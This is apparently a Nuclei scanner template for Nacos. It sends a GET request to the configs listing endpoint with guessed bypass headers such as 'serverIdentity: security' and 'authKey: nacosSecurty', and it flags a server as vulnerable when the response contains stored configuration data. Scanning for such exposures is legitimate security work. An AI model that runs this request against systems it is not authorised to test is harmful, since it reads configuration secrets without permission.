id: nacos-getConfigs
 
info:
  name: nacos-getConfigs
  author: SecurityArt
  severity: high
  tags: nacos

http:
  - raw:
      - |              
        GET /nacos/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=100&tenant=&search=blur&accessToken=&username= HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
        Accept-Encoding: gzip, deflate 
        Connection: close
        nacos: nacos
        serverIdentity: security
        test: test
        example: example
        authKey: nacosSecurty
        
    matchers:
      - type: word
        words:
          - "totalCount"
          - "dataId"
          - "content"
        condition: and
